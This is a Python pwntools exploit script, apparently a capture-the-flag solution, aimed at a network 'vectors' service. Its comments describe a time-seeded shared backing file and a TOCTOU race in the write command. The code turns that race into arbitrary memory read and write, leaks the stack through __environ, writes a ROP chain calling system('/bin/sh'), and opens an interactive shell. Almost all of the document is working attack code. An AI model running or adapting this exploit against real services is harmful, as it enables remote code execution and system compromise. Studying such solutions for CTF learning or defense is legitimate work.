from pwn import *

# If two clients are connected within 1s, the backed file for the vector can be same.
# Because the filename is /tmp/rand(), which is seeded by time(0).
# 
# And there's an exploitable bug:
# A vector's structure is like this:
# struct vector {
# 	size_t size, is_large;
# 	union {
# 		size_t small_elems[32];
# 		struct {
# 			size_t *large_elems;
# 			size_t large_size;
# 		}
# 	}
# }
# 
# "small vector" comes "large vector" when an element is pushed when the length is 32.
# Then is_large becomes 1, but it's checked before "value ?" prompt in write command.
# So there's TOCTOU, allowing another client to modify large_elems / large_size.
# 
# Comments for the exploit steps are below.

HOST, PORT = "vectors.420blaze.in", "420"
# HOST, PORT = "192.168.137.154", 31337

libc = ELF('/=/Downloads2/_libc.so.6')

class V(object):
	def __init__(self):
		self.r = remote(HOST, PORT)

		self.menu = lambda: self.r.recvuntil("> ")
		self.prompt = lambda: self.r.recvuntil('? ')
		self.ii = lambda x: self.r.sendline(str(x))
		self.verbose = True

	def push(self, vec, value):
		self.ii('push')
		self.ii(vec)
		self.ii(value)
		self.menu()
		self.prompt()
		self.prompt()
		self.update_address()

	def write(self, vec, index, value):
		self.ii('write')
		self.ii(vec)
		self.ii(index)
		self.ii(value)
		self.menu()
		self.prompt()
		self.menu()
		self.prompt()
		self.update_address()

	def read(self, vec, index):
		self.ii('read')
		self.ii(vec)
		self.ii(index)
		self.menu()
		self.prompt()
		self.menu()
		self.r.recvuntil(' == ')
		result = int(self.r.recvline())
		self.update_address()
		return result

	def update_address(self):
		lines = self.r.recvuntil('\nread', drop=True).strip().split('\n')
		if self.verbose:
			print '\n'.join(lines)
		lines = [eval(x) for x in lines]
		self.entries = lines

# Connect two clients
r1 = V()
r2 = V()

# To write index 0(large_ptr), the vector must have 1 element.
r1.push(0, 0)
time.sleep(1)

# Go to "value ?" prompt on write command,
r2.ii('write')
r2.ii('0')
r2.ii('0')
r2.menu()
r2.prompt()
r2.menu()
r2.prompt()

# then wait. push 32 elements on r1, making it large vector.
for i in range(32):
	r1.push(0, 0)

# set large_ptr to mapped_base.
base = r1.entries[1][0] - 0x120
r2.ii(base)

# is it called offset2lib, anyways, I used dynelf to find a base from a mmapped address.
ld = base - 0x21f000
libc.address = base - 0xe28000
r1.verbose = False

# pwntools contains a useful converter from leak(addr) -> str to leak.q/str/etc(addr), and it's called MemLeak.
# this function gives an arbitrary read primitive.
@MemLeak
def leak(x):
	if x % 8:
		return
	idx = (x - base) / 8
	idx &= 2 ** 64 - 1
	return p64(r1.read(0, idx))

# r2.ii(0x41414141)

# and then the length is modifiable.
r1.write(0, 0, 2**64-1)

# check if the size's modified.
assert r1.entries[0][1] == 2 ** 64 - 1
r2.r.close()

pause()
# Leak stack address and traverse until the return address is found.
stack = leak.q(libc.symbols['__environ'])
vs = []
while True:
	v = leak.q(stack)
	vs.append(v)
	if len(vs) >= 3:
		if vs[-1] & 0xfff == 0xba3 and vs[-3] & 0xfff == 0xed8:
			print hex(stack)
			break
	stack -= 8

x = stack

rop = [
# pop rdi
libc.search('\x5f\xc3').next(),
# /bin/sh
libc.search('/bin/sh\x00').next(),
# system
libc.symbols['system']
]

for i in range(len(rop)):
	idx = (x - base) / 8
	x += 8
	r1.write(0, idx, rop[i])

# Make main function to return.
r1.ii('yo')

# shell popped!
r1.r.interactive()
